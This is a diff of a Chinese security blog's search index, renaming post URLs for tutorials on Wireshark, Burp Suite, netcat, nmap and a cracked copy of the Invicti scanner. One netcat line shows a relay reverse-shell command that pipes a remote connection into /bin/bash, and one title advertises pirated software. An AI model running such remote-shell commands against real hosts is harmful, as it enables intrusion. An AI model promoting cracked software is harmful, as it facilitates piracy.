@@ -2,7 +2,7 @@
 <search>
   <entry>
     <title>wireshark抓包新手使用教程</title>
-    <url>/2023/05/24/wireshark-zhua-bao-xin-shou-shi-yong-jiao-cheng/</url>
+    <url>/2023/05/24/wireshark-shi-yong-jiao-cheng/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1、wireshark启动后，wireshark处于抓包状态中。"><a href="#1、wireshark启动后，wireshark处于抓包状态中。" class="headerlink" title="1、wireshark启动后，wireshark处于抓包状态中。"></a>1、wireshark启动后，wireshark处于抓包状态中。</h2><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/w1.png"></p>
 <h2 id="2、执行需要抓包的操作，如在cmd窗口下执行ping-www-baidu-com。"><a href="#2、执行需要抓包的操作，如在cmd窗口下执行ping-www-baidu-com。" class="headerlink" title="2、执行需要抓包的操作，如在cmd窗口下执行ping www.baidu.com。"></a>2、执行需要抓包的操作，如在cmd窗口下执行ping <a href="http://www.baidu.com./">www.baidu.com。</a></h2><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/202306031609424.png"></p>
 <p>操作完成后相关数据包就抓取到了。为避免其他无用的数据包影响分析，可以通过在过滤栏设置过滤条件进行数据包列表过滤，获取结果如下。说明：ip.addr &#x3D;&#x3D; 119.75.217.26 and icmp 表示只显示ICPM协议且源主机IP或者目的主机IP为119.75.217.26的数据包。说明：协议名称icmp要小写。</p>
@@ -42,8 +42,8 @@
       </tags>
   </entry>
   <entry>
-    <title>netcat使用技巧</title>
-    <url>/2023/04/21/hello-world/</url>
+    <title>Burp Suite使用技巧</title>
+    <url>/2023/04/21/burp-suite-shi-yong-jiao-cheng/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h1><p>Burp Suite是任何道德黑客武器库的重要组成部分。作为评估网站安全性的可靠工具，它是一个代理工具，能够拦截用户浏览器和目标网站之间的请求和响应，还提供了对网站功能的可见性。这使得道德黑客有能力改变这些请求，利用网站上的安全漏洞或访问受限制的部分。</p>
 <p>该解决方案有三种版本：免费版、专业版和企业版。</p>
 <p>主要特点：</p>
@@ -119,12 +119,12 @@
         <category>黑客工具</category>
       </categories>
       <tags>
-        <tag>netcat</tag>
+        <tag>Burp Suite</tag>
       </tags>
   </entry>
   <entry>
     <title>Invicti v22.11.0破解版（原Netsparker)</title>
-    <url>/2023/04/21/invicti-shi-yong/</url>
+    <url>/2023/04/21/invicti-shi-yong-jiao-cheng/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Invicti"><a href="#Invicti" class="headerlink" title="Invicti"></a>Invicti</h3><p>Invicti，之前名为Netsparker，是一个基于web的应用程序安全扫描黑客工具，能够发现SQL注入、XSS、web应用程序中的漏洞。</p>
 <p>主要特点：</p>
 <ul>
@@ -145,7 +145,7 @@
   </entry>
   <entry>
     <title>netcat使用技巧</title>
-    <url>/2023/04/21/netcat-shi-yong-ji-qiao/</url>
+    <url>/2023/04/21/netcat-shi-yong-jiao-cheng/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Netcat常用参数"><a href="#Netcat常用参数" class="headerlink" title="Netcat常用参数"></a>Netcat常用参数</h2><ul>
 <li>-l： 开启监听</li>
 <li>-p：指定端口</li>
@@ -199,7 +199,7 @@ kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445
   </entry>
   <entry>
     <title>nmap使用教程</title>
-    <url>/2023/04/06/nmap-shi-yong-zhi-nan/</url>
+    <url>/2023/04/06/nmap-shi-yong-jiao-cheng/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Nmap-简介"><a href="#Nmap-简介" class="headerlink" title="Nmap 简介"></a>Nmap 简介</h2><p>nmap 是一个开源、免费的网络探测工具，适用于&#96;windows、linux、mac 等多种操作系统。能够快速扫描大型网络或者单个主机，可以发现网络上有哪些主机，这些主机提供什么服务，服务运行在什么操作系统（包括版本系统），扩大攻击范围。</p>
 <ul>
 <li>识别目标网络内活跃主机</li>
